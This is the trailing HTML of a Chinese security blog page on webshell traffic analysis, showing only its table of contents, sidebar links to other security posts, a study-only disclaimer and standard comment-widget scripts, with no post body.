href="/2024/11/24/CS%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="CS流量分析"><img class="cover" src="https://s2.loli.net/2024/11/24/c2dVi6q8tWxrHyu.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-24</div><div class="title">CS流量分析</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/07/25/vfQGdHozb2LrhtB.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">轻安</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/qingannn"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎师傅</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0%E6%B5%81%E9%87%8F"><span class="toc-number">1.</span> <span class="toc-text">冰蝎3.0流量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#paylaod%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">paylaod分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E7%89%B9%E5%BE%81"><span class="toc-number">1.2.</span> <span class="toc-text">弱特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%A7%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">流量解码分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E4-0"><span class="toc-number">2.</span> <span class="toc-text">冰蝎4.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">3.</span> <span class="toc-text">蚁剑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%94%BB%E5%87%BB%E5%91%BD%E4%BB%A4%E9%83%A8%E5%88%86"><span class="toc-number">3.0.1.</span> <span class="toc-text">分析攻击命令部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">4.</span> <span class="toc-text">哥斯拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D"><span class="toc-number">5.</span> <span class="toc-text">webshell快速定位</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析"><img src="https://s2.loli.net/2024/11/24/hnSfdGNKxzFWvuo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Webshell流量分析"/></a><div class="content"><a class="title" href="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">Webshell流量分析</a><time datetime="2024-11-24T07:52:16.000Z" title="发表于 2024-11-24 15:52:16">2024-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/24/CS%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="CS流量分析"><img src="https://s2.loli.net/2024/11/24/c2dVi6q8tWxrHyu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CS流量分析"/></a><div class="content"><a class="title" href="/2024/11/24/CS%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="CS流量分析">CS流量分析</a><time datetime="2024-11-23T16:44:22.000Z" title="发表于 2024-11-24 00:44:22">2024-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/24/CTF-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="CTF-PHP反序列化漏洞"><img src="https://s2.loli.net/2024/11/24/x5rIsi1toEJq3Md.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-PHP反序列化漏洞"/></a><div class="content"><a class="title" href="/2024/11/24/CTF-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="CTF-PHP反序列化漏洞">CTF-PHP反序列化漏洞</a><time datetime="2024-11-23T16:17:28.000Z" title="发表于 2024-11-24 00:17:28">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/08/winrar-CVE-2023-38831-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%97%A0%E6%84%9F%E4%B8%8A%E7%BA%BF/" title="winrar CVE-2023-38831 漏洞复现&amp;自解压无感上线">winrar CVE-2023-38831 漏洞复现&amp;自解压无感上线</a><time datetime="2023-10-08T15:13:35.000Z" title="发表于 2023-10-08 23:13:35">2023-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/" title="winrar自解压钓鱼木马"><img src="https://s2.loli.net/2023/09/28/BePtjmrHLvNG2Yi.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="winrar自解压钓鱼木马"/></a><div class="content"><a class="title" href="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/" title="winrar自解压钓鱼木马">winrar自解压钓鱼木马</a><time datetime="2023-09-28T02:30:27.000Z" title="发表于 2023-09-28 10:30:27">2023-09-28</time></div></div></div></div></div></div></main><footer id="footer" style="background: SlateGray"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 轻安</div><div class="footer_custom_text">本博客所展示内容仅限于网络安全学习和研究，一切违法犯罪行为与本人无关。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'https://qingannn.github.io/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'
+    this.page.identifier = '/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'
+    this.page.title = 'Webshell流量分析'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
